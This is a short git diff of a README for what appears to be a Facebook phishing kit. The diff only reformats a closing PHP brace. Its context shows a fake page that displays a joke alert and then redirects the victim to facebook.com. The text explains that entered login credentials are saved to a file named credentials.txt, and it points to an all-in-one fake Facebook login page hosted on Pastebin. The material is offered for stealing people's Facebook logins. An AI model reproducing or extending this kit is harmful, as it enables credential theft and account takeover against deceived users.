@@ -60,8 +60,9 @@ Just change the `action` value to any valid html or php file like `action="fblog
         <script>window.alert('Bhadhayi ho tumhe pyar ho gya hai 100%');
         </script>
         <script>window.location="https://facebook.com";</script> 
-<?php                                                  
-    }                                                   ?>
+<?php                                                 
+    }
+?>
 ```
 After login a new file will be created with name `credentials.txt` where credentials will be saved. Well i am also giving my Facebook login page on [Pastebin](https://pastebin.com/tEQHSLtv) which is a single All-In-One file.
 
